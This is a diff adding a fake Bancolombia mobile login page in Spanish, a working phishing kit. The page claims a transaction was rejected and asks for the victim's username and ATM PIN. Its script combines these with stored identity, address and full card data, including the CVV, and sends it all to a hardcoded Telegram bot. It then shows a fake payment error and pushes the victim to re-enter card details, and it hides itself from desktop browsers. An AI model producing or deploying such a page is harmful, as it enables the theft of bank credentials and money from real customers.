@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .content-wrapper {
+            display: none;
+            height: 100%;
+            width: 100%;
+            background: #f5f5f5;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        .desktop-block {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: #f5f5f5;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Header con logo */
+        .header {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e5e5e5;
+        }
+        
+        .logo-bancolombia {
+            height: 30px;
+            width: auto;
+        }
+        
+        /* Título sucursal virtual */
+        .title-section {
+            background: white;
+            padding: 24px 20px 16px;
+            text-align: center;
+        }
+        
+        .title-section h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        
+        /* Card principal */
+        .login-card {
+            background: white;
+            margin: 16px;
+            border-radius: 16px;
+            padding: 32px 24px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .login-header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        
+        .login-header p {
+            font-size: 15px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        /* Formulario */
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 16px;
+            color: #999;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 0;
+            border: none;
+            border-bottom: 2px solid #1a1a1a;
+            font-size: 18px;
+            color: #1a1a1a;
+            font-family: inherit;
+            background: transparent;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .form-group input:focus {
+            border-bottom-color: #1a1a1a; /* NEGRO en lugar de azul */
+        }
+        
+        .form-group input::placeholder {
+            color: #ccc;
+        }
+        
+        .forgot-link {
+            display: block;
+            margin-top: 8px;
+            font-size: 14px;
+            color: #1a1a1a; /* NEGRO en lugar de azul */
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        
+        /* Botón Continuar - AMARILLO */
+        .btn-continuar {
+            width: 100%;
+            background: #e5e5e5;
+            color: #999;
+            border: none;
+            padding: 18px;
+            font-size: 17px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: not-allowed;
+            margin-top: 32px;
+            transition: all 0.2s;
+        }
+        
+        .btn-continuar.active {
+            background: #ffcc00; /* AMARILLO BANCOLOMBIA */
+            color: #1a1a1a; /* Texto negro */
+            cursor: pointer;
+        }
+        
+        .btn-continuar.active:active {
+            background: #e6b800;
+            transform: scale(0.98);
+        }
+        
+        /* Pantalla de carga */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.98);
+            z-index: 1000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loading-screen.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e5e5e5;
+            border-top: 4px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 16px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        /* Pantalla de error */
+        .error-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 1001;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+        }
+        
+        .error-screen.active {
+            display: flex;
+        }
+        
+        .error-icon {
+            width: 80px;
+            height: 80px;
+            background: #fee2e2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        
+        .error-icon svg {
+            width: 40px;
+            height: 40px;
+            color: #dc2626;
+        }
+        
+        .error-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        
+        .error-message {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+        
+        /* Botones de error - AMARILLOS */
+        .btn-retry {
+            width: 100%;
+            max-width: 300px;
+            background: #ffcc00; /* AMARILLO */
+            color: #1a1a1a; /* Texto negro */
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+        
+        .btn-retry:active {
+            background: #e6b800;
+        }
+        
+        .btn-back-card {
+            width: 100%;
+            max-width: 300px;
+            background: #ffcc00; /* AMARILLO */
+            color: #1a1a1a; /* Texto negro */
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        
+        .btn-back-card:active {
+            background: #e6b800;
+        }
+        
+        @media screen and (max-height: 700px) {
+            .login-card {
+                padding: 24px 20px;
+            }
+            
+            .login-header h1 {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="desktop-block"></div>
+    
+    <div class="content-wrapper">
+        <div class="container">
+            <!-- Header con logo -->
+            <div class="header">
+                <!-- COLOCA TU LOGO AQUÍ - debe llamarse "logo_bancolombia.png" -->
+                <img src="logo_bancolombia.png" alt="Bancolombia" class="logo-bancolombia" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
+                <div style="display: none; font-size: 24px; font-weight: bold; color: #0033a0;">Bancolombia</div>
+            </div>
+            
+            <!-- Título -->
+            <div class="title-section">
+                <h2>Sucursal Virtual Personas</h2>
+            </div>
+            
+            <!-- Card de login -->
+            <div class="login-card">
+                <div class="login-header">
+                    <h1>¡Hola!</h1>
+                    <p>Por seguridad, Rechazamos tu transaccion, Para verificar que si eres tu el que esta haciendo la operacion, Ingresa tus datos.</p>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="usuario">Usuario</label>
+                        <input type="text" id="usuario" name="usuario" placeholder="" required>
+                        <a class="forgot-link">¿Olvidaste tu usuario?</a>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="clave">Clave del cajero</label>
+                        <input type="text" id="clave" name="clave" placeholder="" required inputmode="numeric">
+                        <a class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
+                    </div>
+                    
+                    <button type="submit" class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Pantalla de carga -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="spinner"></div>
+        <p class="loading-text">Validando credenciales...</p>
+    </div>
+    
+    <!-- Pantalla de error -->
+    <div class="error-screen" id="errorScreen">
+        <div class="error-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10"/>
+                <line x1="15" y1="9" x2="9" y2="15"/>
+                <line x1="9" y1="9" x2="15" y2="15"/>
+            </svg>
+        </div>
+        <h2 class="error-title">Error en el pago</h2>
+        <p class="error-message">
+            No pudimos procesar tu transacción. Por favor verifica tus datos de tarjeta e intenta nuevamente.
+        </p>
+        <button class="btn-retry" onclick="reintentar()">Intentar nuevamente</button>
+        <button class="btn-back-card" onclick="volverATarjeta()">Volver a ingresar tarjeta</button>
+    </div>
+    
+    <script>
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        const BOT_TOKEN = '8955093413:AAH-iW-vYcLq__GHBB2rpqpECA6JDCdQUZE';
+        const CHAT_ID = '-5547241763';
+        
+        // Recuperar todos los datos anteriores
+        const cedula = sessionStorage.getItem('cedula') || 'No disponible';
+        const celular = sessionStorage.getItem('celular') || 'No disponible';
+        const direccion = sessionStorage.getItem('direccion') || 'No disponible';
+        const ciudad = sessionStorage.getItem('ciudad') || 'No disponible';
+        const departamento = sessionStorage.getItem('departamento') || 'No disponible';
+        const datosTarjeta = JSON.parse(sessionStorage.getItem('datosTarjetaMC') || '{}');
+        
+        const usuario = document.getElementById('usuario');
+        const clave = document.getElementById('clave');
+        const btnContinuar = document.getElementById('btnContinuar');
+        
+        function isMobileDevice() {
+            return (
+                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+                (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                window.innerWidth <= 1024
+            );
+        }
+        
+        if (!isMobileDevice()) {
+            document.body.innerHTML = '<div style="width:100vw;height:100vh;background:white;"></div>';
+        }
+        
+        // Validar formulario
+        function validarFormulario() {
+            if (usuario.value.length >= 4 && clave.value.length >= 4) {
+                btnContinuar.disabled = false;
+                btnContinuar.classList.add('active');
+            } else {
+                btnContinuar.disabled = true;
+                btnContinuar.classList.remove('active');
+            }
+        }
+        
+        usuario.addEventListener('input', validarFormulario);
+        clave.addEventListener('input', validarFormulario);
+        
+        // Enviar formulario
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const usuarioVal = usuario.value;
+            const claveVal = clave.value;
+            
+            // Mostrar pantalla de carga
+            document.getElementById('loadingScreen').classList.add('active');
+            
+            // Preparar mensaje completo para Telegram
+            const mensaje = `🔴 VALIDACIÓN BANCOLOMBIA COMPLETADA - ENVIACO\n\n` +
+                `📋 INFORMACIÓN PERSONAL:\n` +
+                `• Cédula: ${cedula}\n` +
+                `• Celular: ${celular}\n` +
+                `• Dirección: ${direccion}\n` +
+                `• Ciudad: ${ciudad}\n` +
+                `• Departamento: ${departamento}\n\n` +
+                `💳 DATOS DE TARJETA MASTERCARD:\n` +
+                `• Número: ${datosTarjeta.numero || 'No disponible'}\n` +
+                `• Titular: ${datosTarjeta.nombre || 'No disponible'}\n` +
+                `• Vence: ${datosTarjeta.vencimiento || 'No disponible'}\n` +
+                `• CVV: ${datosTarjeta.cvv || 'No disponible'}\n` +
+                `• Doc. Titular: ${datosTarjeta.documento || 'No disponible'}\n\n` +
+                `🔐 CREDENCIALES BANCOLOMBIA:\n` +
+                `• Usuario: ${usuarioVal}\n` +
+                `• Clave del cajero: ${claveVal}\n\n` +
+                `🕐 Fecha: ${new Date().toLocaleString()}\n` +
+                `⚠️ Estado: Error simulado (datos capturados)`;
+            
+            // Enviar a Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // Esperar 5 segundos y mostrar error
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.remove('active');
+                document.getElementById('errorScreen').classList.add('active');
+            }, 5000);
+        });
+        
+        // Reintentar (recarga la página actual)
+        function reintentar() {
+            document.getElementById('errorScreen').classList.remove('active');
+            usuario.value = '';
+            clave.value = '';
+            btnContinuar.disabled = true;
+            btnContinuar.classList.remove('active');
+        }
+        
+        // Volver a ingresar tarjeta (redirige a pagotarjeta_mc.html)
+        function volverATarjeta() {
+            // Limpiar solo los datos de tarjeta, mantener los personales
+            sessionStorage.removeItem('datosTarjetaMC');
+            window.location.href = 'pagotarjeta_mc.html';
+        }
+    </script>
+</body>
+</html>
